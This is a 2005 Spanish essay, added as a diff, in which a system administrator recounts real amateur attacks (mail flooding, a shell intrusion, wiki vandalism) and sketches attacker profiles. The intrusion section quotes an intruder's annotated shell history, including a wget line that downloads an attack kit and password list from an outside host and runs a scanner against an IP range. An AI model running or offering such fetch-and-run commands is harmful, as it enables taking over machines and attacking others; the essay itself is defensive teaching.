@@ -1,0 +1,229 @@
+{Título: Crackers que creen ser hackers, descubriendo y aprendiendo}
+{Autor: Igor Támara}
+{Organización: FECTP}
+{Dirección: [mailto:igor@tamarapatino.org igor@tamarapatino.org] }
+{Versión: 0.1}
+{Fecha: 5 de Junio de 2005}
+{Idioma: es}
+
+{Resumen: Este documento muestra como algunos crackers atacan y como \
+sus ataques pueden ser prevenidos, o simplemente resultan infructuosos \
+probablemente la mayoría de "ataques" son simplemente intentos por \
+aprender, en otros casos, hay personas que consideran que a través de \
+la red se puede llegar a hacer terrorismo.  Y por supuesto que se le \
+puede hacer gastar valioso tiempo a ciertas personas.  Espero que este \
+escrito no sea una pérdida de tiempo y que sirva para que hagamos de \
+la red, un espacio más cómodo para construir.  Para entender más exte \
+texto, por favor consulte \
+http://igor.tamarapatino.org/escritos/hackersycrackers}
+
+{Copyright: puede redistribuir esta información sin problema, en caso \
+de que quiera hacer modificaciones o republicarla, por favor contacte \
+al autor para poder llevar un registro.}
+
+= Ejemplos de ataques de crackers =
+
+A continuación algunos ejemplos de crackers que han tratado de 
+introducir información o romper esquemas de seguridad.  Todos estos,
+casos de la vida real.
+
+== D.O.S. por envío masivo de correo ==
+
+El correo electrónico es especialmente vulnerable a ataques de este 
+estilo, aunque con filtros de spam, se puede hacer que la máquina 
+descarte los mensajes.  Por ejemplo, un atacante puede tratar de 
+enviar unos 200 mensajes en un segundo a una máquina a intervalos
+de 5 minutos.
+
+Esto se puede volver un inconveniente si se envía a una lista de correo
+moderada, porque al moderador le comenzarán a llegar miles de mensajes 
+en poco tiempo y se puede ocupar espacio en disco de forma innecesaria
+por las copias que quedan en la base de datos de los manejadores de
+listas de correo.
+
+Particularmente se puede determinar la IP desde la cuál están enviando
+los correos electrónicos por un script, o un programa específico o 
+porque la máquina tiene relay abierto para que cualquiera haga uso de
+ella para este tipo de acciones.  Es usual que se envíen mensajes falsos
+con identidades falsas y que las empresas ISP colombianas no tengan en 
+la línea de soporte personas que puedan reconvenir a sus usuarios, los
+cuales son sus clientes, y "el cliente siempre tiene la razón", a pesar
+de que esté sembrando anarquía.
+
+Se puede cortar de raíz y evitar el procesamiento al filtro de spam o 
+que se tenga que crear reglas al nivel de aplicación, interceptando los
+mensajes desde una capa inferior del modelo OSI, por ejemplo :
+ iptables -A INPUT -i eth1 -p TCP --dport 25 -s 200.75.79.172 -j REJECT
+
+Esta regla se usaría en iptables e indicaría que a la tarjeta de red
+eth1 le haga retornar mensajes de error al puerto de correo al computador
+con IP pública 200.75.79.172.
+
+Esto acabaría con la intromisión molesta y evitaría que el SMTP en 
+conjunción con el filtro de spam o un antivirus empleen tiempo de 
+procesador en las máquinas que procesan correo.
+
+Por supuesto, esto es insuficiente cuando el ataque es descentralizado,
+pero un cracker promedio no haría algo tan sofisticado.
+
+== Entradas a máquinas a través de shells ==
+
+Revisar continuamente las entradas desde sitios del exterior es algo
+ineludible, sobre todo si se tiene máquinas con acceso ssh, un
+administrador de red nunca permitirá que en sus máquinas haya sesiones
+rsh o telnet que no estén sobre un canal seguro.
+
+Es indispensable revisar que las conexiones sean desde sitios desde
+donde se espera estén entrando las personas que tienen cuenta.  Aquí
+el administrador no tiene mucho control sobre la forma en la cual los
+usuarios elijen claves, y no hay certeza de que alguien no pueda
+descubrir por prueba y error la clave de un usuario poco cuidadoso.
+
+Otra cuestión importante es habilitar shells que tengan restringidos
+los servicios, un ejemplo es '''rbash'''.
+
+A continuación el log de un cracker en acción :
+
+Comienza con una revisión de programas instalados para ver si puede
+lanzar un ataque :
+
+    1  w
+No sabe la diferencia entre ruta absoluta y relativa
+    2  cat etc/issue
+    3  uname -a
+    4  wget
+    5  ls
+    6  cd /tmp
+En este caso no tenía permiso para cambiar de directorio
+    7  ls
+    8  cd 
+No está muy seguro cómo se hace para cambiar una clave
+    9  passswd
+   10  passwd
+   11  w
+   12  php -v
+   13  cd /var/tmp
+   14  w
+   15  cd /var/tmp
+A pesar de que la máquina no permitía cambio de directorios lo intentó
+varias veces, al parecer, no sabe qué significa los mensajes que el
+computador le ofrece.
+   16  ls
+Seguramente copió y pego esto de algún sitio, porque le contaron que
+con un script kiddie como estos era posible tomar el control de la
+máquina para lanzar un ataque a otras máquinas.
+   17  wget display.home.ro/trapper.tar.gz;tar zxvf trapper.tar.gz;rm
+    -rf trapper.tar.gz;cd list;rm -rf pass_file;wget
+    display.home.ro/pass_file;echo Gata Mai Adi87 am instalat ... acum
+    dai cu ./a ip.ip Hai success ca nu te mai tin cu vba
+   18  ./a 201.246
+Ejecuta el binario a
+   19  ls
+   20  uname -a
+   21  cat /etc/hosts
+   22  cat /etc/vhosts
+
+Finalmente el cracker sale de la máquina, creyendo que no ha sido
+descubierto, para su sorpresa, la próxima vez que ingresa(2 días
+después) se encuentra con que .bashrc contiene lo siguiente :
+ echo "
+ Dear cracker, want to learn ?"
+ echo Use your time productively, look at :
+ echo http://tuxedo.org/~esr/faqs/hacker-howto.html
+ echo So you can become a real hacker.
+ echo "Want to Join?
+
+ "
+ exit
+
+Un mensaje para el cracker que no le permite ingresar a la máquina, y
+le muestra cierta información para animarlo a volverse un hacker ;)
+
+Lo interesante es que del cracker se determinó las IPs desde las
+cuáles entró y se envió un correo electrónico a los administradores de
+las máquinas acerca del posible compromiso de seguridad que pueden
+tener en las mismas.
+
+== Edición malintencionada de wikis ==
+
+Los wikis son una de las mejores herramientas para construir 
+documentación colaborativa en red, y la idea de los mismos, es 
+facilitar la creación de contenidos sin castigar a los que quieren 
+colaborar, por eso generalmente se usan sin ninguna autenticación,
+esperando que la depuración de la información sea hecha por las
+personas que lo visitan regularmente, es un proceso evolutivo de 
+la documentación, terminan siendo páginas vivas, que diariamente
+crecen y mejoran, los contenidos viven su selección natural.
+
+= Perfil de los atacantes =
+
+No todos los atacantes son iguales, y generalmente los crackers
+son personas que encuentran información de coctel en Internet y 
+tratan de aplicarla sin realmente mucho conocimiento, unos son
+educables y otros no.    Un cracker puede convertirse en una persona
+si acude a los sitios correctos, de otra forma, terminará solamente
+en un sitio.
+
+== Perfil número 1 ==
+
+La curiosidad natural de los adolescentes les hace ir por sitios 
+en los cuáles creen que encontrarán respuestas rápidas y fáciles a
+cualquier circunstancia, por ejemplo, descubrir claves de otras
+personas, cambiarles las cosas, en general, jugar y llamar la
+atención de los demás.  Aunque por otra parte, saben que sus
+pilatunas no son del todo correctas, pero la curiosidad los vence
+y terminan entrando a sitios donde pueden aprender cosas. Ellos
+posiblemente se regeneran después de algunos intentos y terminan
+enseñando a otros cosas maravillosas que han aprendido.
+
+En su proceso terminan aliándose hacia las personas que saben que
+con esfuerzo continuo y con tablas de valores que redundan en sana
+convivencia, podrán tener una buena vida.
+
+== Perfil número 2 ==
+
+Son los que lastimosamente no tuvieron una educación basada en
+valores reales y hacen sus ataques pagos por otras personas, no
+entienden el valor del trabajo de los demás y a pesar de que saben
+que están haciendo cosas que ellos no desearían les hicieran, 
+insisten en hacerlas.  Ejemplo de estas personas son los que se
+prestan a hacer envío de UCE o SPAM.
+
+Gracias a estos personajes, gran parte del procesamiento de los
+sistemas de correo se centran en filtrar virus y spam, es una lástima
+que el poder de cómputo de los equipos actuales no se pueda dedicar
+a algo más interesante que estas labores y que los administradores
+de red se vuelvan cada vez más costosos por tener que estar luchando
+para defender a sus usuarios de estos personajes.
+
+== El resto ==
+
+Personas que no encuentran un lugar en el mundo y que definitivamente
+desean llamar la atención o hacer quedar mal a otros, que finalmente 
+no dan la cara cuando llevan a cabo sus acciones, por ejemplo, que
+envían correos anónimos, que envían correos a nombre de otras personas
+o que editan wikis de forma malintencionada y evitando ser descubiertos,
+no saben que SI es posible determinar quiénes son, y que se podrían
+llevar a cabo acciones legales.
+
+= Preguntas frecuentes =
+
+== De atacantes ==
+
+== De administradores ==
+
+= Lo que viene =
+
+== Cuestiones legales ==
+
+= Explicando términos técnicos =
+
+;D.O.S.: Esto significa Denial Of Service, quiere decir que un servicio \
+está fuera de línea.  En la vida real, cuando un banco se sobresatura de \
+clientes comienzan esas filas interminables, y simplemente no se puede \
+atender a los requerimientos de los clientes.
+
+= Acerca de =
+
+Este documento fue construido con experiencias propias del autor, y
+usted es bienvenido a hacer adiciones y mejoras al mimso.
